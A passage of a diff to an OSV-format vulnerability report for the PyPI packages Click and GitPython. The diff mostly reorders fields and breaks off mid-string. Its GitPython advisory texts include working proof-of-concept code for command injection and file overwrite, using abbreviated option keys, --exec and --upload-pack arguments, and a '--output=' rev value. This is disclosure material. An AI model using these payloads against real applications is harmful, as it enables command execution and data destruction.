@@ -371,30 +371,25 @@
             "version": "8.3.1",
             "ecosystem": "PyPI"
           },
-          "groups": [
-            {
-              "ids": [
-                "PYSEC-2026-2132"
-              ],
-              "aliases": [
-                "CVE-2026-7246",
-                "GHSA-47fr-3ffg-hgmw",
-                "PYSEC-2026-2132"
-              ],
-              "max_severity": "7.2"
-            }
-          ],
-          "licenses": [
-            "BSD-3-Clause"
-          ],
           "vulnerabilities": [
             {
+              "modified": "2026-07-13T07:15:21Z",
+              "published": "2026-04-30T14:16:36Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-2132",
+              "aliases": [
+                "CVE-2026-7246",
+                "GHSA-47fr-3ffg-hgmw"
+              ],
+              "details": "Pallets Click, versions 8.3.2 and below, contain a command injection vulnerability in the click.edit() function, allowing attackers to pass arbitrary OS commands from an unprivileged account.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/click/PYSEC-2026-2132.yaml"
-                  },
-                  "ecosystem_specific": {},
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "click",
@@ -402,6 +397,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -409,8 +405,7 @@
                         {
                           "fixed": "8.3.3"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -474,17 +469,12 @@
                     "8.3.0",
                     "8.3.1",
                     "8.3.2"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/click/PYSEC-2026-2132.yaml"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-7246",
-                "GHSA-47fr-3ffg-hgmw"
-              ],
-              "details": "Pallets Click, versions 8.3.2 and below, contain a command injection vulnerability in the click.edit() function, allowing attackers to pass arbitrary OS commands from an unprivileged account.",
-              "id": "PYSEC-2026-2132",
-              "modified": "2026-07-13T07:15:21.899333658Z",
-              "published": "2026-04-30T14:16:36.433Z",
               "references": [
                 {
                   "type": "WEB",
@@ -514,15 +504,24 @@
                   "type": "EVIDENCE",
                   "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw"
                 }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
-                  "type": "CVSS_V3"
-                }
               ]
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2026-2132"
+              ],
+              "aliases": [
+                "CVE-2026-7246",
+                "GHSA-47fr-3ffg-hgmw",
+                "PYSEC-2026-2132"
+              ],
+              "max_severity": "7.2"
+            }
+          ],
+          "licenses": [
+            "BSD-3-Clause"
           ]
         },
         {
@@ -921,55 +920,25 @@
             "version": "3.1.50",
             "ecosystem": "PyPI"
           },
-          "groups": [
-            {
-              "ids": [
-                "GHSA-2f96-g7mh-g2hx"
-              ],
-              "aliases": [
-                "GHSA-2f96-g7mh-g2hx"
-              ],
-              "max_severity": "8.8"
-            },
-            {
-              "ids": [
-                "GHSA-956x-8gvw-wg5v"
-              ],
-              "aliases": [
-                "GHSA-956x-8gvw-wg5v"
-              ],
-              "max_severity": "8.4"
-            },
-            {
-              "ids": [
-                "GHSA-rwj8-pgh3-r573"
-              ],
-              "aliases": [
-                "GHSA-rwj8-pgh3-r573"
-              ],
-              "max_severity": "7.5"
-            },
-            {
-              "ids": [
-                "GHSA-v396-v7q4-x2qj"
-              ],
-              "aliases": [
-                "GHSA-v396-v7q4-x2qj"
-              ],
-              "max_severity": "8.7"
-            }
-          ],
-          "licenses": [
-            "BSD-3-Clause"
-          ],
           "vulnerabilities": [
             {
+              "modified": "2026-07-23T03:14:29Z",
+              "published": "2026-07-21T19:43:43Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-2f96-g7mh-g2hx",
+              "related": [
+                "CGA-wpw7-54fg-vx4m"
+              ],
+              "summary": "GitPython: Command Injection via git long-option prefix abbreviation bypass of CVE-2026-42215 blocklist",
+              "details": "## Command injection via long-option prefix abbreviation bypassing `check_unsafe_options` (incomplete fix of CVE-2026-42215 / GHSA-rpm5-65cw-6hj4)\n\n**Component:** gitpython-developers/GitPython (PyPI: GitPython)\n**Affected:** all versions carrying the 3.1.47 blocklist fix, through current `main` (verified at commit `20c5e275`, `3.1.50-42`)\n**CWE:** CWE-184 (Incomplete List of Disallowed Inputs) \u2192 CWE-78 (OS Command Injection)\n**Severity:** inherits the parent CVE-2026-42215 surface; estimated High, ~8.8 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) \u2014 final scoring deferred to maintainer/CNA, mirroring the parent.\n**Reporter:** hackkim\n\n### Summary\n\nThe 3.1.47 fix for CVE-2026-42215 blocks dangerous git options (`--upload-pack`, `--config`, `-c`, `-u` for clone; `--upload-pack` for fetch/pull; `--receive-pack`, `--exec` for push) so callers cannot reach command-executing options unless they pass `allow_unsafe_options=True`.\n\nThe fix canonicalizes an option name along **one** axis (underscore\u2192hyphen via `dashify`) and checks it against an **exact-match** dict. It does not account for git's unambiguous long-option prefix abbreviation. Git accepts any unambiguous prefix of a long option (`--upload-p`, `--upload-pa`, `--upload-pac` all resolve to `--upload-pack`). So a kwarg key like `upload_p` canonicalizes to `upload-p`, misses the blocklist dict, and is emitted to git as `--upload-p=<value>` \u2192 executed as `--upload-pack=<value>` \u2192 command injection, in the default `allow_unsafe_options=False` configuration.\n\n### The asymmetry (root cause)\n\n```python\n# git/cmd.py (commit 20c5e275), lines 948-974\n@classmethod\ndef _canonicalize_option_name(cls, option):\n    option_name = option.lstrip(\"-\").split(\"=\", 1)[0]\n    option_tokens = option_name.split(None, 1)\n    if not option_tokens:\n        return \"\"\n    return dashify(option_tokens[0])      # only transform: \"_\" -> \"-\"\n\n@classmethod\ndef check_unsafe_options(cls, options, unsafe_options):\n    canonical_unsafe_options = {cls._canonicalize_option_name(o): o for o in unsafe_options}\n    for option in options:\n        unsafe_option = canonical_unsafe_options.get(cls._canonicalize_option_name(option))\n        if unsafe_option is not None:\n            raise UnsafeOptionError(...)\n```\n\nThe guard normalizes only `_`\u2192`-` and does exact dict membership. Git's CLI parser accepts a broader grammar (prefix abbreviation) than the guard models, so abbreviated keys slip through and reach git as the blocked option.\n\n### Affected code (commit `20c5e275`)\n\n| Location | Role |\n|---|---|\n| `git/cmd.py:948-960` `_canonicalize_option_name` | canonicalizer \u2014 no prefix expansion |\n| `git/cmd.py:963-974` `check_unsafe_options` | exact-match dict lookup (the incomplete guard) |\n| `git/cmd.py:1511` `transform_kwarg` | emits `--<dashify(name)>=<value>` to the CLI |\n| `git/repo/base.py:1411,1413` | clone call sites |\n| `git/remote.py:1074,1128,1201` | fetch / pull / push call sites |\n\n### Bypass keys (verified)\n\n| kwarg key | git resolves to | path | weaponizable |\n|---|---|---|---|\n| `upload_p`, `upload_pac` | `--upload-pack` | clone / fetch / pull | Yes \u2014 direct RCE |\n| `receive_p` | `--receive-pack` | push | Yes \u2014 direct RCE |\n| `exe` | `--exec` | push | Yes \u2014 direct RCE |\n| `conf`, `confi` | `--config` | clone | bypasses option blocklist; RCE needs an additional config vector (see note) |\n\n### Minimal PoC\n\nSelf-contained, no network egress (a local bare repo acts as the \"remote\"). Tested on current `main` (git 2.50.1):\n\n```python\nimport os, stat, tempfile\nfrom git import Repo\n\nwork = tempfile.mkdtemp()\nmarker = os.path.join(work, \"RCE_MARKER\")\n\n# fake \"upload-pack\" program that proves arbitrary command execution\nprog = os.path.join(work, \"evil.sh\")\nwith open(prog, \"w\") as f:\n    f.write(f\"#!/bin/sh\\ntouch {marker}\\nexit 1\\n\")  # exit 1 so git aborts after our code ran\nos.chmod(prog, os.stat(prog).st_mode | stat.S_IEXEC)\n\nbare = os.path.join(work, \"remote.git\")\nRepo.init(bare, bare=True)\n\n# attacker-controlled kwarg KEY 'upload_p' -> --upload-p=<prog> -> git runs <prog>\ntry:\n    Repo.clone_from(bare, os.path.join(work, \"out\"), upload_p=prog)\nexcept Exception:\n    pass  # git aborts with GitCommandError AFTER the payload executed\n\nprint(\"RCE marker created:\", os.path.exists(marker))  # True -> command injection confirmed\n```\n\nEquivalent at the shell: `git clone --upload-p=/tmp/evil.sh src out` runs `evil.sh`.\n\nConfirmed behavior:\n- `upload_pack` (exact) \u2192 blocked; `upload_p` (abbrev) \u2192 passes guard, reaches git, executes. The fix works for the form it models but not the abbreviated form.\n- `allow_unsafe_options=True` opt-out behaves as documented (out of scope).\n\n### Honest scope note\n\nLike the parent CVE, exploitation requires a host application that flows attacker-controlled kwarg **keys** into a GitPython clone/fetch/pull/push. Where the host passes only fixed/validated keys, this is not reachable \u2014 the vulnerability is in the library's documented defense-in-depth control (`allow_unsafe_options=False`), which this variant defeats.\n\nOn the `--config` family: `conf` bypasses the option blocklist, but weaponizing `--config protocol.ext.allow=always` via an `ext::` URL is independently blocked by GitPython's protocol allowlist (`allow_unsafe_protocols=False`). The directly weaponizable family is `upload-pack` / `receive-pack` / `exec`. Reported transparently \u2014 not claiming Critical.\n\n### Suggested remediation (any one)\n\n1. **Prefix-aware matching:** reject any option whose canonical name is an unambiguous prefix of a blocked option (\u2248 `startswith` on the blocked canonical name, after `dashify`).\n2. **Disable abbreviation at the sink:** pass `--end-of-options` or invoke git in a way that disables long-option abbreviation.\n3. **Allowlist** option names on security-sensitive subcommands instead of a blocklist.\n\nRemediation should also cover the `-c`/`--config` family abbreviations, even though the `ext::` route is currently gated by the protocol allowlist.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "last_known_affected_version_range": "<= 3.1.50",
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2f96-g7mh-g2hx/GHSA-2f96-g7mh-g2hx.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "gitpython",
@@ -977,6 +946,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -984,8 +954,7 @@
                         {
                           "fixed": "3.1.51"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -1092,23 +1061,13 @@
                     "3.1.7",
                     "3.1.8",
                     "3.1.9"
-                  ]
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.50",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2f96-g7mh-g2hx/GHSA-2f96-g7mh-g2hx.json"
+                  }
                 }
               ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-184",
-                  "CWE-78"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T19:43:43Z",
-                "nvd_published_at": null,
-                "severity": "HIGH"
-              },
-              "details": "## Command injection via long-option prefix abbreviation bypassing `check_unsafe_options` (incomplete fix of CVE-2026-42215 / GHSA-rpm5-65cw-6hj4)\n\n**Component:** gitpython-developers/GitPython (PyPI: GitPython)\n**Affected:** all versions carrying the 3.1.47 blocklist fix, through current `main` (verified at commit `20c5e275`, `3.1.50-42`)\n**CWE:** CWE-184 (Incomplete List of Disallowed Inputs) \u2192 CWE-78 (OS Command Injection)\n**Severity:** inherits the parent CVE-2026-42215 surface; estimated High, ~8.8 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) \u2014 final scoring deferred to maintainer/CNA, mirroring the parent.\n**Reporter:** hackkim\n\n### Summary\n\nThe 3.1.47 fix for CVE-2026-42215 blocks dangerous git options (`--upload-pack`, `--config`, `-c`, `-u` for clone; `--upload-pack` for fetch/pull; `--receive-pack`, `--exec` for push) so callers cannot reach command-executing options unless they pass `allow_unsafe_options=True`.\n\nThe fix canonicalizes an option name along **one** axis (underscore\u2192hyphen via `dashify`) and checks it against an **exact-match** dict. It does not account for git's unambiguous long-option prefix abbreviation. Git accepts any unambiguous prefix of a long option (`--upload-p`, `--upload-pa`, `--upload-pac` all resolve to `--upload-pack`). So a kwarg key like `upload_p` canonicalizes to `upload-p`, misses the blocklist dict, and is emitted to git as `--upload-p=<value>` \u2192 executed as `--upload-pack=<value>` \u2192 command injection, in the default `allow_unsafe_options=False` configuration.\n\n### The asymmetry (root cause)\n\n```python\n# git/cmd.py (commit 20c5e275), lines 948-974\n@classmethod\ndef _canonicalize_option_name(cls, option):\n    option_name = option.lstrip(\"-\").split(\"=\", 1)[0]\n    option_tokens = option_name.split(None, 1)\n    if not option_tokens:\n        return \"\"\n    return dashify(option_tokens[0])      # only transform: \"_\" -> \"-\"\n\n@classmethod\ndef check_unsafe_options(cls, options, unsafe_options):\n    canonical_unsafe_options = {cls._canonicalize_option_name(o): o for o in unsafe_options}\n    for option in options:\n        unsafe_option = canonical_unsafe_options.get(cls._canonicalize_option_name(option))\n        if unsafe_option is not None:\n            raise UnsafeOptionError(...)\n```\n\nThe guard normalizes only `_`\u2192`-` and does exact dict membership. Git's CLI parser accepts a broader grammar (prefix abbreviation) than the guard models, so abbreviated keys slip through and reach git as the blocked option.\n\n### Affected code (commit `20c5e275`)\n\n| Location | Role |\n|---|---|\n| `git/cmd.py:948-960` `_canonicalize_option_name` | canonicalizer \u2014 no prefix expansion |\n| `git/cmd.py:963-974` `check_unsafe_options` | exact-match dict lookup (the incomplete guard) |\n| `git/cmd.py:1511` `transform_kwarg` | emits `--<dashify(name)>=<value>` to the CLI |\n| `git/repo/base.py:1411,1413` | clone call sites |\n| `git/remote.py:1074,1128,1201` | fetch / pull / push call sites |\n\n### Bypass keys (verified)\n\n| kwarg key | git resolves to | path | weaponizable |\n|---|---|---|---|\n| `upload_p`, `upload_pac` | `--upload-pack` | clone / fetch / pull | Yes \u2014 direct RCE |\n| `receive_p` | `--receive-pack` | push | Yes \u2014 direct RCE |\n| `exe` | `--exec` | push | Yes \u2014 direct RCE |\n| `conf`, `confi` | `--config` | clone | bypasses option blocklist; RCE needs an additional config vector (see note) |\n\n### Minimal PoC\n\nSelf-contained, no network egress (a local bare repo acts as the \"remote\"). Tested on current `main` (git 2.50.1):\n\n```python\nimport os, stat, tempfile\nfrom git import Repo\n\nwork = tempfile.mkdtemp()\nmarker = os.path.join(work, \"RCE_MARKER\")\n\n# fake \"upload-pack\" program that proves arbitrary command execution\nprog = os.path.join(work, \"evil.sh\")\nwith open(prog, \"w\") as f:\n    f.write(f\"#!/bin/sh\\ntouch {marker}\\nexit 1\\n\")  # exit 1 so git aborts after our code ran\nos.chmod(prog, os.stat(prog).st_mode | stat.S_IEXEC)\n\nbare = os.path.join(work, \"remote.git\")\nRepo.init(bare, bare=True)\n\n# attacker-controlled kwarg KEY 'upload_p' -> --upload-p=<prog> -> git runs <prog>\ntry:\n    Repo.clone_from(bare, os.path.join(work, \"out\"), upload_p=prog)\nexcept Exception:\n    pass  # git aborts with GitCommandError AFTER the payload executed\n\nprint(\"RCE marker created:\", os.path.exists(marker))  # True -> command injection confirmed\n```\n\nEquivalent at the shell: `git clone --upload-p=/tmp/evil.sh src out` runs `evil.sh`.\n\nConfirmed behavior:\n- `upload_pack` (exact) \u2192 blocked; `upload_p` (abbrev) \u2192 passes guard, reaches git, executes. The fix works for the form it models but not the abbreviated form.\n- `allow_unsafe_options=True` opt-out behaves as documented (out of scope).\n\n### Honest scope note\n\nLike the parent CVE, exploitation requires a host application that flows attacker-controlled kwarg **keys** into a GitPython clone/fetch/pull/push. Where the host passes only fixed/validated keys, this is not reachable \u2014 the vulnerability is in the library's documented defense-in-depth control (`allow_unsafe_options=False`), which this variant defeats.\n\nOn the `--config` family: `conf` bypasses the option blocklist, but weaponizing `--config protocol.ext.allow=always` via an `ext::` URL is independently blocked by GitPython's protocol allowlist (`allow_unsafe_protocols=False`). The directly weaponizable family is `upload-pack` / `receive-pack` / `exec`. Reported transparently \u2014 not claiming Critical.\n\n### Suggested remediation (any one)\n\n1. **Prefix-aware matching:** reject any option whose canonical name is an unambiguous prefix of a blocked option (\u2248 `startswith` on the blocked canonical name, after `dashify`).\n2. **Disable abbreviation at the sink:** pass `--end-of-options` or invoke git in a way that disables long-option abbreviation.\n3. **Allowlist** option names on security-sensitive subcommands instead of a blocklist.\n\nRemediation should also cover the `-c`/`--config` family abbreviations, even though the `ext::` route is currently gated by the protocol allowlist.",
-              "id": "GHSA-2f96-g7mh-g2hx",
-              "modified": "2026-07-23T03:14:29.723431971Z",
-              "published": "2026-07-21T19:43:43Z",
               "references": [
                 {
                   "type": "WEB",
@@ -1131,25 +1090,35 @@
                   "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
                 }
               ],
-              "related": [
-                "CGA-wpw7-54fg-vx4m"
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "GitPython: Command Injection via git long-option prefix abbreviation bypass of CVE-2026-42215 blocklist"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-184",
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T19:43:43Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
             },
             {
+              "modified": "2026-07-23T03:14:30Z",
+              "published": "2026-07-21T20:10:06Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-956x-8gvw-wg5v",
+              "related": [
+                "CGA-78vw-9344-jhxg"
+              ],
+              "summary": "GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`",
+              "details": "## Summary\n\nGitPython spawns the real `git` binary with an argument vector built from caller-supplied values. To prevent argument injection, GitPython maintains denylists of \"unsafe\" Git options (`--upload-pack`, `--receive-pack`, `--exec`, `-c`, `--config`, \u2026) that can be abused to run arbitrary commands, and enforces them with `Git.check_unsafe_options()`.\n\nThat enforcement is only wired into the **network** commands \u2014 `clone_from`, `Remote.fetch`, `Remote.pull`, `Remote.push`. Several other public APIs that also forward caller-controlled values into the `git` argv have **no guard at all**:\n\n1. **`Repo.archive(ostream, treeish=None, prefix=None, **kwargs)`** forwards `**kwargs` verbatim into `git archive`. An attacker-influenced options mapping such as `{\"remote\": \".\", \"exec\": \"<cmd>\"}` becomes `git archive --remote=. --exec=<cmd> -- <treeish>`, and `git archive --remote=<local repo>` invokes `git-upload-archive` whose path is overridden by `--exec` \u2192 **arbitrary command execution under default Git configuration** (no `protocol.ext.allow` needed).\n\n2. **`repo.git.ls_remote(<url>, upload_pack=\"<cmd>\")`** (and the dynamic-command builder generally) turns the `upload_pack` kwarg into `--upload-pack=<cmd>` with no guard \u2192 **arbitrary command execution**.\n\n3. **`Repo.iter_commits(rev)`** and **`Repo.blame(rev, file)`** place the caller's `rev` value into the argv *before* the `--` end-of-options separator and apply no leading-dash check. A benign-looking ref value such as `--output=/path/to/file` is parsed by `git rev-list` / `git blame` as the `--output` option, which **opens and truncates an arbitrary file** before Git even validates the revision \u2192 arbitrary file clobber (integrity/availability; can destroy keys, configs, lockfiles, or be aimed at files the host later sources).\n\nThe first two are direct code execution; the third is an arbitrary file-overwrite primitive. All share one root cause: the `check_unsafe_options` / end-of-options discipline that GitPython applies to clone/fetch/pull/push was never extended to these sinks.\n\n## Details\n\nGitPython explicitly recognises these options as command-execution vectors. `git/remote.py:535`:\n\n```python\nunsafe_git_fetch_options = [\n    # Arbitrary command execution.\n    \"--upload-pack\",\n    \"--receive-pack\",\n    # Arbitrary file overwrite.\n    \"--exec\",\n]\n```\n\nand enforces them via `Git.check_unsafe_options()` (`git/cmd.py:963`):\n\n```python\ndef check_unsafe_options(cls, options, unsafe_options):\n    ...\n    if unsafe_option is not None:\n        raise UnsafeOptionError(f\"{unsafe_option} is not allowed, use `allow_unsafe_options=True` to allow it.\")\n```\n\nBut `check_unsafe_options` is invoked from **only five sites**, all network commands:\n\n```\ngit/remote.py:1071   Remote.fetch\ngit/remote.py:1125   Remote.pull\ngit/remote.py:1198   Remote.push\ngit/repo/base.py:1410 / :1412  Repo.clone_from\n```\n\nThe following sinks call `git` with caller-controlled options/positionals and are **not** guarded:\n\n### 1. `Repo.archive` \u2014 command execution (`git/repo/base.py:1623`)\n\n```python\ndef archive(self, ostream, treeish=None, prefix=None, **kwargs):\n    ...\n    self.git.archive(\"--\", treeish, *path, **kwargs)\n    return self\n```\n\n`treeish` and `path` are correctly placed after `--`, but `**kwargs` are converted by `Git.transform_kwarg` (`git/cmd.py:1487`) into `--<name>=<value>` flags and inserted **before** the `--` by `_call_process`, with no `check_unsafe_options`. `Repo.archive` already documents user-facing kwargs (`format`, `prefix`, `path`), so forwarding a caller options mapping is an expected usage. Final argv:\n\n```\ngit archive --remote=. --exec=<cmd> -- <treeish>\n```\n\n`git archive --remote=<repo>` runs the upload-archive helper; `--exec=<cmd>` overrides the helper path, executing `<cmd>` on the host. This works with **default Git config** \u2014 it does not rely on the `ext::` transport (which is blocked by default).\n\n### 2. `repo.git.ls_remote(..., upload_pack=...)` \u2014 command execution (dynamic builder, `git/cmd.py:1487`)\n\n`transform_kwarg` dashifies `upload_pack` \u2192 `--upload-pack=<value>`. `git ls-remote <local-repo> --upload-pack=<cmd>` executes `<cmd>`. The dynamic builder makes **both** the flag name and value caller-controlled (`repo.git.<anything>(**user_dict)`), and `ls_remote` has no `check_unsafe_options`.\n\nThis is exactly the underscore-kwarg-vs-hyphen-kwarg gap that CVE-2026-42215 fixed for `fetch`/`pull`/`push`/`clone_from` \u2014 but `ls_remote` and the rest of the dynamic surface were left unpatched.\n\n### 3. `Repo.iter_commits` / `Repo.blame` \u2014 arbitrary file overwrite (`git/objects/commit.py:348`, `git/repo/base.py:1199`)\n\n```python\n# Commit.iter_items (reached via Repo.iter_commits)\nproc = repo.git.rev_list(rev, args_list, as_process=True, **kwargs)   # args_list == [\"--\", *paths]\n```\n\n```python\n# Repo.blame\ndata = self.git.blame(rev, *rev_opts, \"--\", file, p=True, stdout_as_string=False, **kwargs)\n```\n\n`rev` is placed **before** `--`, with no leading-dash check anywhere in the path. A caller passing `rev=\"--output=/path\"` (a value that looks like an ordinary ref/branch/tag string an app forwards from user input) produces:\n\n```\ngit rev-list --output=/path --\n```\n\n`git rev-list`/`log`/`blame` honour `--output=<file>`, which `open()`s and truncates the file *before* validating the revision \u2014 so the file is destroyed even though Git then errors out on the bad revision.\n\n## PoC\n\nAll three PoCs are self-contained, run against the released **GitPython 3.1.50** under **default Git configuration**, and were executed live (git 2.51.0). Each prints a host-side marker proving the effect.\n\n### Install\n\n```bash\npython3 -m venv venv && . venv/bin/activate\npip install GitPython           # resolves to 3.1.50\npython -c \"import git; print(git.__version__)\"   # 3.1.50\n```\n\n### PoC 1 \u2014 command execution via `Repo.archive`\n\n```python\n# archive_rce.py\nimport io, os, tempfile, subprocess, git\n\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a',\n                'commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\n\nmarker = os.path.join(tempfile.gettempdir(), 'gp_rce_marker')\nif os.path.exists(marker): os.remove(marker)\n\n# a service lets a user export a repo and forwards their options dict\nopts = {'remote': '.', 'exec': 'touch ' + marker}\ntry:\n    repo.archive(io.BytesIO(), **opts)\nexcept git.exc.GitCommandError as e:\n    print('[*] git exited non-zero (expected), but the exec already ran:', str(e).splitlines()[0][:60])\n\nprint('[+] marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git exited non-zero (expected), but the exec already ran: Cmd('git') failed due to: exit code(128)\n[+] marker present: True\n```\n\n`git config --get protocol.ext.allow` returns nothing (unset = default), confirming no special config is required.\n\n### PoC 2 \u2014 command execution via `git.ls_remote(upload_pack=...)`\n\n```python\n# lsremote_rce.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nmarker = os.path.join(tempfile.gettempdir(),'gp_lsr_marker')\nif os.path.exists(marker): os.remove(marker)\ntry:\n    repo.git.ls_remote('.', upload_pack='touch '+marker+';')\nexcept git.exc.GitCommandError as e:\n    print('[*] git err:', str(e).splitlines()[0][:50])\nprint('[+] ls-remote marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git err: Cmd('git') failed due to: exit code(128)\n[+] ls-remote marker present: True\n```\n\n### PoC 3 \u2014 arbitrary file overwrite via a benign-looking `rev`\n\n```python\n# itercommits_filewrite.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nvictim = os.path.join(tempfile.gettempdir(),'gp_fw_victim')\nopen(victim,'w').write('do not delete\\n')\nprint('[*] before:', repr(open(victim).read()))\nuser_ref = '--output=' + victim          # value an app forwards as a \"ref/branch\"\ntry:\n    list(repo.iter_commits(user_ref))\nexcept git.exc.GitCommandError as e:\n    print('[*] git err (after open+truncate):', str(e).splitlines()[0][:50])\nprint('[+] after :', repr(open(victim).read()), '<- truncated')\n```\n\nVerbatim output:\n\n```\n[*] before: 'do not delete\\n'\n[*] git err (after open+truncate): Cmd('git') failed due to: exit code(129)\n[+] after : '' <- truncated\n```",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "last_known_affected_version_range": "<= 3.1.50",
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-956x-8gvw-wg5v/GHSA-956x-8gvw-wg5v.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "gitpython",
@@ -1157,6 +1126,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -1164,8 +1134,7 @@
                         {
                           "fixed": "3.1.51"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -1272,23 +1241,13 @@
                     "3.1.7",
                     "3.1.8",
                     "3.1.9"
-                  ]
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.50",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-956x-8gvw-wg5v/GHSA-956x-8gvw-wg5v.json"
+                  }
                 }
               ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-77",
-                  "CWE-88"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T20:10:06Z",
-                "nvd_published_at": null,
-                "severity": "HIGH"
-              },
-              "details": "## Summary\n\nGitPython spawns the real `git` binary with an argument vector built from caller-supplied values. To prevent argument injection, GitPython maintains denylists of \"unsafe\" Git options (`--upload-pack`, `--receive-pack`, `--exec`, `-c`, `--config`, \u2026) that can be abused to run arbitrary commands, and enforces them with `Git.check_unsafe_options()`.\n\nThat enforcement is only wired into the **network** commands \u2014 `clone_from`, `Remote.fetch`, `Remote.pull`, `Remote.push`. Several other public APIs that also forward caller-controlled values into the `git` argv have **no guard at all**:\n\n1. **`Repo.archive(ostream, treeish=None, prefix=None, **kwargs)`** forwards `**kwargs` verbatim into `git archive`. An attacker-influenced options mapping such as `{\"remote\": \".\", \"exec\": \"<cmd>\"}` becomes `git archive --remote=. --exec=<cmd> -- <treeish>`, and `git archive --remote=<local repo>` invokes `git-upload-archive` whose path is overridden by `--exec` \u2192 **arbitrary command execution under default Git configuration** (no `protocol.ext.allow` needed).\n\n2. **`repo.git.ls_remote(<url>, upload_pack=\"<cmd>\")`** (and the dynamic-command builder generally) turns the `upload_pack` kwarg into `--upload-pack=<cmd>` with no guard \u2192 **arbitrary command execution**.\n\n3. **`Repo.iter_commits(rev)`** and **`Repo.blame(rev, file)`** place the caller's `rev` value into the argv *before* the `--` end-of-options separator and apply no leading-dash check. A benign-looking ref value such as `--output=/path/to/file` is parsed by `git rev-list` / `git blame` as the `--output` option, which **opens and truncates an arbitrary file** before Git even validates the revision \u2192 arbitrary file clobber (integrity/availability; can destroy keys, configs, lockfiles, or be aimed at files the host later sources).\n\nThe first two are direct code execution; the third is an arbitrary file-overwrite primitive. All share one root cause: the `check_unsafe_options` / end-of-options discipline that GitPython applies to clone/fetch/pull/push was never extended to these sinks.\n\n## Details\n\nGitPython explicitly recognises these options as command-execution vectors. `git/remote.py:535`:\n\n```python\nunsafe_git_fetch_options = [\n    # Arbitrary command execution.\n    \"--upload-pack\",\n    \"--receive-pack\",\n    # Arbitrary file overwrite.\n    \"--exec\",\n]\n```\n\nand enforces them via `Git.check_unsafe_options()` (`git/cmd.py:963`):\n\n```python\ndef check_unsafe_options(cls, options, unsafe_options):\n    ...\n    if unsafe_option is not None:\n        raise UnsafeOptionError(f\"{unsafe_option} is not allowed, use 